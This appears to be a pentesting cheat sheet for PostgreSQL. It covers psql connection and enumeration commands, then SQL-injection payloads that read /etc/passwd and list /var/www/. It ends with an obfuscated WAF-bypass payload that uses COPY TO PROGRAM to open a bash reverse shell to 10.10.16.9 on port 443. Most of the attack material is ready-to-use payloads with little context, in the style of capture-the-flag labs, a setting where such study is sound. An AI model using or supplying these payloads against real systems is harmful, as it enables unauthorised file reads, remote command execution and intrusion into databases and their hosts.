
## Connection

```bash
psql -U <myuser>
### local connection

psql -h <host> -U <username> -d <database>
### remote connection

psql -h <host> -p <port> -U <username> -W <password> <database>
### complete remote connection with all params
```

---

## Enumeration

```sql
\l
-- List All Databases

\c <database_name>
-- switch to a Database

\dt
-- list tables in current Database

SELECT * FROM <table_name>;
-- extract all records from the specific table
```

---

## File System Operations

```sql
''; SELECT pg_read_file('/etc/passwd',0,1000);
-- read contents of a file, this reads 0:1000 characters

''; SELECT pg_ls_dir('/var/www/');
-- list contents of directory
```

---

## Advanced Exploitation

### Reverse Shell WAF Bypass through SQL Injection

```sql
'';DO $reverse$
DECLARE
    s text;
BEGIN
    s := CHR(67)||CHR(79)||CHR(80)||CHR(89)||
         ' (SELECT '''') TO PROGRAM ' ||
         quote_literal('bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"');
    EXECUTE s;
END $reverse$;
```

This technique uses PostgreSQL's `COPY` command with a program execution to establish a reverse shell connection. The payload:

* Uses `CHR()` functions to obfuscate the "COPY" command
* Executes a bash reverse shell connecting to IP `10.10.16.9` on port `443`
* Bypasses basic WAF filters through string concatenation

---